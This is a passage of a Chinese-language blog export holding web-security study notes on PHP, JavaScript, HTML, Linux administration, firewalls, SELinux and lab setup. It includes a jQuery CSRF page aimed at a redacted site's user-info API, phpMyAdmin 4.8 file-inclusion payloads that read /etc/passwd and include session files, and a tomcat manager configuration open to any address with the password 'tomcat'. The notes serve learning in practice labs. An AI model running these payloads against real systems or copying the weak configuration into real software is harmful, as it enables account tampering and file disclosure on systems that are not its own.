    <content type="text"><![CDATA[Abstract: php基础语法和变量 1. 基础规范 PHP脚本形式&lt;?php ?&gt; PHP脚本可以单独存在，也可以与htm页面结合 PHP文件扩展名规范，一般是.php结尾，但可以使用其他命名，例如.phtm等 2. PHP三种运行方式 CLI就是命令行 1php -f index.php CGI模式： Common Gateway Interface，公共网关接口，程序须运行在网络服务器上 module模式： 3. 扩展加讲解 apache服务器或nginx php运行环境 数据库 4. PHP中的数据类型12345678910#### 变量的数据类型： * 布尔类型 * 整型 * 浮点型 * 字符串 * 资源 * 空类型 * 数组 * 对象 使用var_dump()来查看类型 PHP中的变量： 变量以$符号开始，后面跟着变量的名称 变量名必须以字母或者下划线字符开始 变量民只能包含字母数字字符以及下划线（A-z、0-9和_） 变量名不能包含空格 变量名是区分大小写的 STDOUT是客户端，只能在终端显示，不能在网页显示 PHP中的常量：123* 常量一旦赋值不会改变，尽量使用大写* 常量分为系统常量和自定义常量* 系统常量可以理解为值不会有改变的亮 定义常量：12* 使用PHP中的函数define()来定义常量* 常量在使用的时候，不需要$符 常用的系统常量：123456789101112//php程序文件名/绝对路径__FILE__//被调用的文件脚本所在的目录__DIR__//函数名__FUNCTION__//php程序文件行数__LINE__//当前解析器的版本号PHP_VERSION//执行当前PHP版本的操作系统名称PHP_OS ​ php靠点连接字符串 12345&lt;?php $a = "name"; $b = "zs"; $c = $a . $b;?&gt; &lt;&lt;&lt;EOF EOF1234567&lt;?p echo &lt;&lt;&lt;EOF &lt;h1&gt;标题&lt;/h1&gt; &lt;p&gt;段落&lt;/p&gt;EOF;//结束需要独立一行且前后不能空格?&gt; php中除了单引号，任意字符放在单引号中将没有任何意义 php中双引号输入特殊字符，将有特殊意义 EOF中变量有意义，其他特殊字符，都没有意义 转移\普通字符变为特殊字符，特殊字符为普通字符]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note14]]></title>
    <url>%2F2019%2F08%2F01%2Fnote14%2F</url>
    <content type="text"><![CDATA[Abstract: JS BOM和jQuery，以及php环境的搭建 1. JS BOMBOM全名Browser Object Model，即浏览器对象模型。 Window方法 12345678#打开新窗口window.open()#关闭当前窗口window.close()#移动当前窗口window.moveTo()#调整当前窗口的尺寸window.resizeTo() Screen屏幕 1234#可用的屏幕宽度screen.availWidth#可用的屏幕高度screen.availHeight Location 1234567891011121314#web主机的域名location.hostname#当前页面的路径和文件名location.pathname#web主机的端口（80和443）location.port#使用的web协议（http或https）location.protocol#返回当前页面的URL（也可以用作跳转）location.href#返回URL的路径名location.pathname#加载新的文档location.assign History 1234#与在浏览器点击后退按钮相同history.back()#与在浏览器点击向前按钮相同history.forward() Navigator 12345678910111213141516171819&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;navigator用法&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="example"&gt;&lt;/div&gt; &lt;script&gt; txt = "&lt;p&gt;浏览器代号：" + navigator.appCodeName + "&lt;/p&gt;"; txt += "&lt;p&gt;浏览器名称：" + navigator.appName + "&lt;/p&gt;"; txt += "&lt;p&gt;浏览器版本：" + navigator.appVersion + "&lt;/p&gt;"; txt += "&lt;p&gt;启用Cookies: " + navigator.cookieEnabled + "&lt;/p&gt;"; txt += "&lt;p&gt;硬件平台：" + navigator.platform + "&lt;/p&gt;"; txt += "&lt;p&gt;用户代理：" + navigator.userAgent + "&lt;/p&gt;"; txt += "&lt;p&gt;用户代理语言：" + navigator.systemLanguage + "&lt;/p&gt;"; document.getElementById("example").innerHTML = txt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 弹窗 123456#警告框window.alert("sometext")#确认框window.confirm("sometext")#提示框window.prompt("sometext", "defaultvalue") 计时 12345678#间隔指定的毫秒数不停的执行指定代码window.setInterval("javascript function", milliseconds)#停止setInterval()方法执行的函数代码window.clearInterval(intervalVariable)#第二个参数指示从当前起多少毫秒后执行第一个参数window.setTimeout("js function", milliseconds)#用于停止执行setTimeout()方法的函数代码window.clearTimeout(timeoutVariable) Cookie cookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。 cookie的作用就是用于解决“如何记录客户端的用户信息” 12* 当用户访问web页面时，他的名字可以记录在cookie中* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录 1234#创建cookiedocument.cookie="username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/";#读取cookievar x = document.cookie; 2. JQuery​ 内容比较细碎，多看看jQuery教程 ​ 使用jQuery对***账户进行CSRF攻击，代码如下： 123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt; &lt;title&gt;hack***&lt;/title&gt; &lt;script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type="text/javascript"&gt; $.ajax(&#123; type:'POST', url:"http://www.***.com/api/user/info", dataType:'json', data: &#123; allow_status:"1", heading:"", id_number:"123456789123456789", nickname:"wangyingminghanpi", real_name:"本币", user_tag:'[]', &#125;, xhrFields:&#123; withCredentials:true //支持附带详细信息,可以携带cookie &#125;, crossDomain: true,//请求偏向外域,支持跨域请求 success: function (data) &#123; console.log(data); &#125; &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>DOM</tag>
        <tag>BOM</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note13]]></title>
    <url>%2F2019%2F08%2F01%2Fnote13%2F</url>
    <content type="text"><![CDATA[Abstract: 初探CSS+JS 1. CSS全程是Cascading Style Sheets 引入方式： 行内样式 1&lt;p style="display:none"&gt;我是段落&lt;/p&gt; 优先级最高 内嵌式 12345678910&lt;head&gt; &lt;style type="text/css"&gt; body&#123; background-color: red &#125; p&#123; margin-left: 20px &#125; &lt;/style&gt;&lt;/head&gt; 外链式 1&lt;link rel="stylesheet" type="text/css" href="css/login.css"&gt; 优先级：行内＞内嵌＞外链 更多内容请访问w3cschool 2. JSgetElementById用法： 12345678#“查找”id="demo"的HTML元素，并修改元素内容document.getElementById('demo').innerHTML = "hello world";#改变HTML元素的样式，是改变HTML属性的一种变种document.getElementById("demo").style.fontSize="25px";#通过改变display样式来隐藏HTML元素document.getElementById("demo").style.display="none";#通过改变display样式来显示隐藏HTML元素document.getElementById("demo").style.display="block"; ​ JS显示方案 ​ 使用window.alert()写入警告框 ​ 使用document.write()写入HTML输出 ​ 使用innerHTML写入HTML元素 ​ 使用console.log()写入浏览器控制台 JS HTML DOM文档 查找HTML元素 123456#通过元素id查找元素document.getElementById(id)#通过标签名来查找元素document.getElementByTagName(name)#通过类名来查找元素document.getElementByClassName(name) 改变HTML元素 123456#改变元素的inner HTMLelement.innerHTML= new html content#改变HTML元素的属性值element.attribute = new value#改变HTML元素的样式element.style.property = new style 添加和删除元素 12345678910#创建HTML元素document.createElement(element)#创建HTML元素document.removeChild(element)#添加HTML元素document.appendChild(element)#替换HTML元素document.replaceChile(element)#写入HTML输出流document.write(text) 添加事件处理程序 12#向onclick事件添加事件处理程序document.getElementById(id).onclick = function()&#123;code&#125; 源码： 1234567891011121314151617181920&lt;html&gt; &lt;title&gt;JS&lt;/title&gt; &lt;body&gt; &lt;div id="div1"&gt; &lt;p id="p1"&gt;这是一个段落。&lt;/p&gt; &lt;p id="p2"&gt;这是第二段落。&lt;/p&gt; &lt;/div&gt; &lt;script&gt; //新建&lt;p&gt;&lt;/p&gt;标签 var para = document.createElement("p"); //新建文档 var node = document.createTextNode("这是用js加的新段落。"); //将node添加到para中 → &lt;p&gt;文档&lt;/p&gt; para.appendChild(node); var element = document.getElementById("div1"); //将p加入到div中 element.appendChild(para); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note12]]></title>
    <url>%2F2019%2F07%2F30%2Fnote12%2F</url>
    <content type="text"><![CDATA[Abstract: 初学HTML 1. 些简单的标签12345678910111213&lt;html&gt; //&lt;html&gt;与&lt;/html&gt;之间的文本描述网页 &lt;head&gt; &lt;title&gt;网页标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; //&lt;body&gt;与&lt;/body&gt;之间的文本是可见的页面内容 &lt;h1&gt; 这是一个标题 //一级标题 &lt;/h1&gt; &lt;p&gt; 这是一个段落 //段落部分 &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 2. html中的标签：12345* HTML标题是通过`&lt;h1&gt;-&lt;h6&gt;`等标签进行定义的* HTML段落是通过`&lt;p&gt;`标签进行定义的* HTML链接是通过`&lt;a&gt;`标签进行定义的* HTML图像是通过`&lt;img&gt;`标签进行定义的* HTML表格是通过`table/thead/tbody/th/td`等标签来定义的 3. HTML form表单1&lt;form action="www.baidu.com" method="get" enctype="application/x-form-urlenconded"&gt; 123* Action 属性表明表单将要提交到哪里* Method 表示提交用的方法分别为`get`和`post`可选* Enctype 规定在发送表单数据前对数据进行编码的格式 4. 输入框&lt;input&gt;标签最常用1234567* `type=&quot;text&quot;` 普通的文本输入框* `type=&quot;password&quot;`带星号的密码输入框* `type=&quot;radio&quot;`单选框，同一类型要有统一的`name`属性，表明是一类* `type=&quot;checkbox&quot;`复选框，添加`checked`属性会默认选中* `type=&quot;file&quot;` 文件上传选择* `type=&quot;email&quot;`带简单验证的邮箱输入* `&lt;textarea&gt;`标签input只能单行输入，`textarea`可以多行输入]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stage1知识盲点]]></title>
    <url>%2F2019%2F07%2F30%2Fstage1-exam%2F</url>
    <content type="text"><![CDATA[Abstract: 知识盲点总结 运行一个脚本，用户不需要什么样的权限？ read write execute browse on the directory 在bash中，在一条命令后加入1&gt;&amp;2意味着： 标准错误输出重定向到标准输入 标准输入重定向到标准错误输出 标准输出重定向到标准错误输出 标准输出重定向到标准输入 1表示标准输出，2表示标准错误，&amp;表示等同于的意思 下面哪条命令可以把f1.txt复制为f2.txt： cp f1.txt |f2.txt cat f1.txt | f2.txt cat f1.txt &gt; f2.txt copy f1.txt | f2.txt 如何显示Linux系统中注册的用户数（包含系统用户）？ account-l nl /etc/passwd |head wc –user /etc/passwd wc –lines /etc/passwd word count，--line/-l只显示行数 命令kill 9的含义是： kills the process whose PID is 9 kills all processes belonging to UID 9 sends SIGKILL to the process whose PID is 9 sends SIGTERM to the process whose PID is 9 在vi中退出不保存的命令是： :q :w :wq :q! 下面哪个协议使用了两个以上的端口： telnet FTP rsh HTTP 什么命令用来只更行已经安装过的rpm软件包： rpm -U *.rpm rpm -F *.rpm rpm -e *.rpm rpm -q *.rpm ping使用的协议是： TCP UDP SMB ICMP Linux系统中添加一个用户，改变账号过期时间，用哪个命令： usermod -a usermod -d usermod -x usermod -e 静态IP和动态IP的区别，具体应用场景 静态IP：IP地址是手动分配的，通常需要付费 动态IP：动态IP是自动分配的 名称 优点 缺点 静态IP 地址不变—适用于web服务器，电子邮件服务器和其他internet服务器 比动态IP贵 静态IP对于VoIP和游戏应用程序更可靠 需要额外的安全性 动态IP 比静态IP地址便宜 需要DHCP服务器才能获取IP地址 更改IP地址可提供更多隐私 非静态的，每次IP地址更改时，可能需要再次找到你的IP 搭建LAMP所需要的命令： 123456789101112131415161718192021222324252627#安装apache服务[root]$ yum install httpd#设置开机启动[root]$ systemctl enable httpd#开启服务[root]$ systemctl start httpd#设置防火墙[root]$ firewall-cmd --zone=public --add-port=80/tcp --permanent[root]$ firewall-cmd --zone=public --add-port=433/tcp --permanent#重新加载，方可生效[root]$ firewall-cmd --reload#安装mysql服务[root]$ yum install mariadb-server#设置开机启动[root]$ systemctl enable mariadb#启动服务[root]$ systemctl start mariadb#初始化mysql[root]$ mysql_secure_installation#安装php[root]$ yum install php php-gd php-mysql php-pdo php-*#重启apache[root]$ systemctl restart httpd#修改网站根目录的用户和用户组[root]$ chown -R apache:apache /var/www/html]]></content>
      <categories>
        <category>Web Security</category>
        <category>summary</category>
      </categories>
      <tags>
        <tag>Linux基本命令 - 搭建服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown语法]]></title>
    <url>%2F2019%2F07%2F29%2Fsimpleapp%2F</url>
    <content type="text"><![CDATA[Abstract: 用typora写markdown文档的语法 标题下划线 下划线 强调重要 斜体斜体 删除删除 方框框起来 注释今天吃啥呀^1 高亮==高亮== 角标上角标：x^2^ 下角标：H2O $x^2+x1$ 转义# List有序 无序 1 2 1 2 todo list 背单词 整理笔记 Table 分割线 插入链接Typora 数学公式$$&lt;Empty \space Math \space Block&gt;$$ 代码12def abc() print() 表情:sweat: :happy: 引用[引用] 引用 目录[TOC]]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>typora</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week2sum]]></title>
    <url>%2F2019%2F07%2F29%2Fweek2sum%2F</url>
    <content type="text"><![CDATA[Abstract: 对第二周学习的内容进行总结 周一Linux权限1.内容简介 Linux权限控制 git服务器搭建与安全检查 tomcat服务器搭建与安全检查 2.几种文件类型 [d] 是目录 [-] 是文件 [l] 是链接文件(link file) 3.读写执行权限 文件类型 属主权限 属组权限 其他用户权限 0 123 456 789 d rwx r-x r-x 目录文件 读写执行 读—执行 读—执行 对于目录的rwx 123* r可以显示文件夹的结构* w可以在文件夹里添加删除文件* x可以进入到文件夹 权限命令：rwx在系统中对应一个个的值，r-4，w-2，x-1 chown修改当前文件或文件夹的所属用户 1chown root:root /tmp/tmp1 1chown -R root:root /tmp/tmp1 chmod修改当前文件或文件夹的权限 语法：chmod [who] [+|-|=] [mode] 文件名 操作对象who： u表示“用户(user)”，即文件或目录的所有者 g表示”同组(group)用户”，即与文件属主有相同组ID的所有用户 o表示”其他(other)用户” a表示”所有(all)用户”，它是系统默认值 推荐使用数字的方式修改文件或者文件夹的权限 操作符可以是： +添加某个权限 -取消某个权限 =赋予给定权限并取消其他所有权限 *不指定用户的情况下，=只会给文件所有者加权限，+给所有者加权限 一个网站最合理的权限是755 4.渗透测试中常用的命令 whoami 查看当前用户 tar 压缩和解压文件 netstat 查看网络状态 nslookup 查看dns信息 ps 查看运行的程序 top 实时查看运行的程序 service 使用service控制服务启动关闭 curl 获取网页，可以使用输出重定向来下载文件 wget 下载文件 1more /etc/apt/sources.list sources.list是各种软件源，常用的源有阿里云、清华大学、中科院 1sudo apt-get update Note: 推荐关机快照 周二tomcat和git服务器搭建1.内容简介 复习 tomcat服务器搭建 2.网络不通该如何调试先用ficonfig查看网卡信息，若正常，ping 网卡，若不正常，查看配置文件和网络环境；若网卡默认不启用，修改配置文件，onboot=yes 重启网络服务，配置文件路径：/etc/sysconfig/network-scripts/ifcfg-eth0 123cat /etc/sysconfig/network-script/ifcfg-eth0vi /etc/sysconfig/network-script/ifcfg-eth0service network restart 若网络环境是dhcp，修改上网方式为dhcp，重启网络服务 若网络环境是静态ip，修改上网方式为static，ipaddr=, netmask=, gateway= 能够ping通8.8.8.8 1curl www.baidu.com 若不能打开，查看dns配置文件 1vi /etc/resolv.conf 添加servername 1.1.1.1 3.搭建tomcat服务器12345#启动防火墙systemctl start firewalld#将80端口添加到防火墙例外并重启firewall-cmd --zone=public --add-por=8080/tcp --permanentfirewall-cmd --reload 防火墙=硬件+软件 1yum apt-get -y install tomcat 1vi .../apache-tomcat-8.5.43/webapps/manager/META-INF/context.xml 修改tomcat配置文件为 12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;Context antiResourceLocking="false" privileged="true"&gt; &lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\d+\.\d+\.\d+\.\d+" /&gt;&lt;/Context&gt; 进入conf目录下修改tomcat-users.xml 用户名和密码 1vi /usr/local/tomcat/conf/tomcat-users.xml 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;tomcat-usersversion="1.0" xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd" xmlns:xsi="http://www/w3.org/2001/XMLSchema-instance" xmlnx="http://tomcat.apache.org/xml"&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;user roles="manager-gui, manager-script, manager-jmx, manager-status, admin-script" password="tomcat" username="tomcat"/&gt;&lt;/tomcat-users&gt; 4.git服务器搭建12345#修改yum源cat CentOS-Base.repo#[base]注释掉mirrorlist和baseurl添加以下语句baseurl=http://192.168.100.110:8000/yum/#以下三个修改为enable=0 12345678910111213141516171819#下载git[root@localhost]$ yum install git#添加git用户[root@localhost]$ useradd git[root@localhost]$ cd /home/git/[root@localhost]$ lltotal 0[root@localhost]$ pwd/home/git[root@localhost]$ cd ..[root@localhost]$ su git[git@localhost]$ mkdir .ssh[git@localhost]$ cd .ssh/[git@localhost]$ touch authorized_keys[git@localhost]$ chmod 600 authorized_keys[git@localhost]$ cd /[git@localhost~]$ mkdir Project[git@localhost~]$ cd Project[git@localhost Project]$ git init --bare icq.git win10启动powershell dir ssh 1ssh-keygen -t rsa 产生两个文件.pub是公钥 123dir .sshtype .\.ssh\id_rsa.pub#获得公钥 粘贴到git用户authorized_keys 12chmod 700 .sshchmod 600 authorized_keys 1yum install git 再创建用户git //管理git中所有的项目 在git用户家目录，创建.ssh文件夹，修改权限为700 //这个是因为ssh服务限制 在.ssh文件夹下创建authorized_keys文件 ，修改权限为600 //这个因为ssh服务的限制，权限不正确认证会失败 在git用户家目录创建project目录，用来存放git项目 12#初始化一个git项目git init --bare icq.git git客户端 安装git // git for windows git for linux windows 10 使用ssh创建公钥和私钥 ssh-keygen -t rsa 就会在家目录创建.ssh文件夹，里面就会有两个文件，将公钥(.pub结尾)写入到服务器authorized_keys文件中 1git clone git@ip:/home/git/project/icq.git Note:默认情况下 ssh git@192.168.100.167可以登录虚拟机，从而产生安全问题，在虚拟机里切换到root权限修改git的shell 1[root@localhost ~] usermod -s /sbin/nologin git 这样ssh就禁止了 5.搭建博客 安装Github桌面版和Node.js 然后cmd中 1npm install -g hexo-cli --registry=https://registry.nom.taobao.org 创建一个blog目录，用来存放博客 进入到blog中，启动cmd执行命令 123456#初始化hexohexo init#生成博客hexo g#搭建服务hexo s 然后浏览器访问播客主页 安装CentOs Mini，安装好后执行 1yum groupinstall "development tools" 周三Linux下应用的安装1.CentOS系统中有三种安装软件的方法 通过源码安装 ./configure make &amp;&amp; make install 通过rpm安装 rpm -ivh … 通过yum安装 yum search … yum install … rpm类型文件安装的时候，会先去读取文件内记载的设置参数内容，然后将该数据用来比对linux系统的环境，以找到是否有属性相依的软件尚未安装的问题。RPM使用自动化安装软件，比较类似windows下的.exe需要下载的安装包，但是它安装过程中会有很多依赖问题。 -q: 仅查询，后面接软件名称是否有安装 -qa: 列出所有，已经安装在本机linux系统上面的所有软件名称 -ql: 列出该软件所有的文件与目录所在完整文件名(list) -qR: 列出与该软件有关的相依软件所在的文件(requried) 源码安装：先阅读README文件，找到安装方法，安装相依赖的库，最后执行 1make &amp;&amp; make install 周四搭建apache+php+mysql和iptables+firewall1.昨天回顾12345yum installrpm -ivh a.rpm/http/ftp:baidu.com/a.tpm nginx.tar.gztar cat readme install./configure --help --prefix=安装路径 --with-apr=指定依赖位置make &amp;&amp; make install 2.搭建apache+php+mysql环境(要求使用php5.6) 安装httpd 12345678#安装httpdyum install httpd httpd-devel httpd-manual mod_ssl -y#启动apachesystemctl start httpd#设置apache开机启动systemctl enable httpd#查看开放端口，检查有没有httpd服务，80和443端口是否开放ss -antlp 配置防火墙，可以正常访问apache 123firewall-cmd --zone=public --add-port=80/tcp --permanentfirewall-cmd --zone=public --add-port=433/tcp --permanentfirewall-cmd --reload 安装php5.6 12345678910rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpmrpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm#卸载系统中原有的phpyum remove php-common -y#安装php5.6和php扩展yum install -y php56w php56w-opcache php56w-xml php56w-mcrypt php56w-gd php56w-mysql php56w-intl php56w-mbstring#进入网站根目录cd /var/www/html/#在网站根目录中创建index.php，写入phpinfo函数，测试网站php是否正常echo '&lt;?php phpinfo();?&gt;' &gt; index.php 安装mariadb 123456789yum install mariadb-server -y#启动mariadb-serversystemctl start mariadb#设置mariadb-server开机自启systemctl enablemariadb#初始化mysql，注意记住mysql密码mysql_secure_installation#关机+快照poweroff 3.关于网站搭建：需要将网站的源代码使用工具复制到虚拟机中的网站根目录下(phpmyadmin除外)，修改网站的所有者为apache 1chown -R apache:apache /var/www/html wordpress特性： ​ 移动网站后，网站的样式将出错，所以wordpress在安装成功后，不能移动 ​ 虚拟机ip改变后，wordpress打开会卡页面，需要去数据库中修改ip wp_options表中 ​ siteurl: http://新ip ​ home: http://新ip 搭建没有提供安装引导的网站： ​ 上传网站源代码到网站根目录，找到网站的配置文件，一般是config.php ​ 再找到网站提供的sql文件，使用phpmyadmin之类工具，导入数据或直接使用mysql -uroot -p 登录数据库 123create database database_nameuse database_namesource absolute_path/name.sql 向数据库中导入内容，有多重方式，可以自行测试 周五Linux安全检查1.防火墙功能：​ filter功能是防火墙一个重要功能，它定义数据通过是允许或者不允许 ​ filter控制数据类型分为两类：INPUT和OUTPUT 2.Iptables命令讲解：-A 追加 -p 指定协议类型 123* tcp通过dport指定目标端口，sport指定源端口* udp通tcp* icmp通过--icmp-type指定类型，0是响应类型的数据包，8是请求类型的包 -m 表示启动扩展功能 ​ 一般和-p配合，-p指定类型后，通过-m打开此类型的扩展功能 -j 指定如何进行处理DROP，REJECT，ACCEPT/丢弃，拒绝，通过 1iptables -A INPUT/OUTPUT -j DROP/REJECT/ACCEPT 编辑iptables的配置文件： ​ 通过编辑文件可以直接修改iptables规则，编辑文件，写入指定规则： 123456-A INPUT -m state --state ESTABLISHED, RELATED -j ACCEPT-A INPUT -p icmp -j ACCEPT-A INPUT -i lo -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j ACCEPT-A INPUT -j REJECT --reject-with icmp-host-prohibited-A FORWARD -j REJECT --reject-with icmp-host-prohibited 12#查看现有规则iptables -nvL 12#添加80端口通过的规则firewallc-cmd --zone=public --add-port=80/tcp --permanent drop 默认丢弃所有包 –zone block 拒绝所有外部连接，允许内部发起连接 public 指定外部连接可以进入 –add-port 指定添加端口 80/tcp 53/udp –add-service 指定常见服务 http https mysql mssql ssh –permanent 永久生效 删除80端口通过的规则 1firewall-cmd --zone=public --remove-port=80/tcp --permanent –remove-port 指定删除端口 –remove-service 指定删除服务 12345678910#防火墙更新规则firewall-cmd --reload#防火墙显示所有规则firewall-cmd --list-all#关闭防火墙systemctl stop firewalld#查看防火墙状态systemctl status firewalld#启动防火墙systemctl start firewalld 临时加立即生效，–reload后失效，–pernament必须，–reload后才失效]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note11]]></title>
    <url>%2F2019%2F07%2F29%2Fnoteday11%2F</url>
    <content type="text"><![CDATA[1. SELINUX即Security-Enhanced Linux，是一个Linux内核模块，也是Linux的一个安全子系统。SELinux作用是最大限度地减少系统中服务进程可访问的资源（最小权限原则）。 如果一个以root身份运行的网络服务存在0day漏洞，黑客就可以利用这个漏洞，以root的身份在您的服务器上为所欲为。SELinux就是解决这个问题。 系统 资源能否被访问因素 无SELinux 某资源是否拥有对应用户的权限（读写执行） SELinux 还需要判断每一类进程是否拥有对某一类资源的访问权限 SELinux的工作模式 模式名称 工作模式 作用 enforcing 强制模式 违反SELinux规则的行为将组织并记录到日志中 permissive 宽容模式 违反SELinux规则的行为只会记录到日志中，调试用 disabled 关闭模式 关闭SELinux SELinux工作模式可以在/etc/selinux/config中设定 12#修改SELinux模式vi /etc/selinux/config 修改以后重启系统即可。 2.phpmyadmin4.8文件包含漏洞goto_whitelist白名单如下： 12345678910public static $goto_whitelist = array( 'db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php',) 进入Vulnspy开始实验 从index.php定位到白名单中的php文件 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php? 将?改%253f读取系统文件，进行多次 ./以进入到系统的根目录，然后读取/etc/passwd 1http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php%253f../../../../../../../../../../etc/passwd Note: target=后面的文件填写白名单文件均可成功，?要用%253f代替 点击SQL输入 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; Note:phpmyadmin特性是所有sql查询语句都早sess_id中存储着。 sess_id在/var/lib/php/session/目录中 3. docker容器类似于虚拟机，依赖与linux 1234567891011#查看创建的镜像docker images#启动dockerservice docker start#修改docker的用户组sudo usermod -G docker $USER#重启虚拟机rebootrebootdocker imagesdocker-composedocker run --rm -it alpine /bin/bash]]></content>
      <categories>
        <category>Web Security</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>SELinux - phpmyadmin</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin-bug]]></title>
    <url>%2F2019%2F07%2F28%2Fphpmyadmin-bug%2F</url>
    <content type="text"><![CDATA[Abstract: phpmyadmin4.8漏洞演示 进入vulnsp网站，点击start to hack，跳转到VSPlat 点击进入实验，点击开始按钮 进入phpmyadmin登录界面，用户名：root，密码：toor登录 点击SQL，输入如下命令： 1select &apos;&lt;?php phpinfo(); exit;?&gt;&apos; 获取自己的SESSION ID 1session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf 包含SESSION文件，成功利用该漏洞 1http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf 网页输入payload，页面如下，成功利用该漏洞]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>bug</tag>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dvwa-deploy]]></title>
    <url>%2F2019%2F07%2F28%2Fdvwa-deploy%2F</url>
    <content type="text"><![CDATA[Abstract: CentOS7部署DVWA DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 安装步骤 1.进入到/var/www目录下，然后wget下载dvwa文件，解压master.zip文件到html文件夹下，进入html文件夹下，修改DVWA-master文件名为dvwa，进入dvwa/config文件夹中，把config.inc.php.dist复制一份，命名为config.inc.php；‘cd /var/www’ &apos;wget https://github.com/ethicalhack3r/DVWA/archive/master.zip&apos; &apos;unzip master.zip -d html/&apos; &apos;cd html &amp;&amp; mv DVWA-master dvwa&apos; &apos;cd dvwa/config/&apos; &apos;co config.inc.php.dist config.inc.php&apos; 2.进入到/etc目录，先把php.ini备份一份名为php.ini.bak.20190727，打开php.ini，把allow_url_include=Off修改为On，保存退出，重启服务；‘cd /etc’ &apos;cp php.ini php.ini.bak.20190727&apos; &apos;vi php.ini&apos; &apos;systemctl restart httpd&apos; 3.进入/var/www/html/dvwa/config目录下，修改config.inc.php，把$_DVWA[ ‘db_password’ ]修改为mysql中root用户密码，并填写公钥和私钥，保存后退出；public_key: 6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6private_key: 6LePqhAUAAAAAMVqhBbFr1NVA9H13FkyfAgBeZYx &apos;cd /var/www/html/dvwa/config&apos; &apos;vi config.inc.php&apos; 4.进入/var/www/html文件中，修改dvwa的用户和用户组‘chown -R apache:apache dvwa/‘ &apos;systemctl restart httpd&apos; 5.部署成功后，登录界面如下图所示，用户名：admin，密码：password，即可登录]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>dvwa</tag>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
